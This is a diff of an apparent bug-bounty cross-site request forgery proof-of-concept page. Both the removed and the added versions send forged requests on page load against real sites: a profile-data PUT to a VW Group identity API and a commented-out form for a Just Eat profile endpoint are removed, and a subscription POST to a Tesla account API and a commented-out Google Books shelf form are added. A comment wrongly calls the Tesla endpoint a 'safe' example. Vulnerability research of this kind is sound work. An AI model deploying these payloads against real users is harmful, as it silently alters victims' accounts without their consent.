@@ -1,40 +1,40 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta name="authorization" content="none">
-  </head>
-  <body>
-    <h1>CSRF PoC for Bug Bounty Submission</h1>
-    <!-- <form action="https://rest.api.eu-central-1.production.jet-external.com/applications/international/consumer/me" method="PATCH" id="csrfPoC">
-      <input type="hidden" name="Name" value="ASJAD" />
-    </form> -->
-    <script>
-      //history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
-      //document.getElementById('csrfPoC').submit();
-      //let bearerToken = 
-      const requestOptions = {
-        method: 'PUT', // Or 'POST', 'PUT', 'DELETE', etc.
-        headers: {
-          //'Authorization': `Bearer ${bearerToken}`,
-          'Content-Type': 'application/json' // Often required for POST/PUT requests
-        },
-        body: JSON.stringify({"dateOfBirth":null,"placeOfBirth":null,"nationalityCode":null,"firstName":"Asjaddd","middleName":null,"lastName":"Butt","nickname":null,"salutation":"SALUTATION:MR","addresses":[],"phoneNumbers":[],"nationalIdentifiers":[],"preferredLanguages":[],"academicTitle":"ACADEMIC_TITLE_SIMPLIFIED:DR"}) // Convert JavaScript object to JSON string
-      };
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>API Request PoC</title>
+    </head>
+    <body>
+        <h2>API GET Request PoC</h2>
+        <!-- <form action="https://books.google.com/books?op=cl_update&sig=ACfU3U0muIggfUwa9I5Fl5Ad_QbA7If8Hw&jscmd=ClUpdate&as_coll=1001&cl_title=ABCD&cl_mode=public" method="POST">
+      <input type="hidden" name="cl_des" value="description" />
+      <input type="submit" value="Click to create book shelf" />
+  </form> -->
+        <script>
+            //document.forms[0].submit();
 
-    fetch("https://vwid.vwgroup.io/profile/put/personalData", requestOptions)
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        return response.json();
-      })
-      .then(data => {
-        console.log('Success:', data);
-        // Do something with the data received
-      })
-      .catch(error => {
-        console.error('Error:', error);
-      });
-    </script>
-  </body>
+            // Example safe API (replace with your own test endpoint)
+            const url = "https://www.tesla.com/teslaaccount/subscription-preferences/api/subscribe";
+
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    Accept: "application/json",
+                },
+                body: JSON.stringify({"categoryId":"BASIC"}),
+            })
+                .then((response) => {
+                    if (!response.ok) {
+                        throw new Error("Network response was not ok " + response.statusText);
+                    }
+                    return response.json();
+                })
+                .then((data) => {
+                    console.log("API Response:", data);
+                })
+                .catch((error) => {
+                    console.error("Fetch error:", error);
+                });
+        </script>
+    </body>
 </html>
